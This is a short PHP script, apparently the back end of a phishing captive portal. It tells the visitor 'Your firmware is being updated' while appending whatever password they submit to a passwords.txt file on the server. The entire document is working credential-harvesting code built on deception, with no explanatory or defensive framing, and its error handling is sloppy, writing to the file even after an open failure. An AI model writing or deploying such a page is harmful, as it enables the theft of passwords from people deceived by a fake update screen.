<?php 
$myFile = '/srv/http/passwords.txt';
if (!file_exists($myFile)) {
  print 'File not found';
}
else if(!$fh = fopen($myFile, 'a+')) {
  print 'Can\'t open file';
}
else {
  print 'Your firmware is being updated......!';
}
$txt = "\n";
fwrite($fh, $txt);
$txt = $_POST['pass'];
fwrite($fh, $txt);
$txt = "\n";
fwrite($fh, $txt);
fclose($fh);
?>
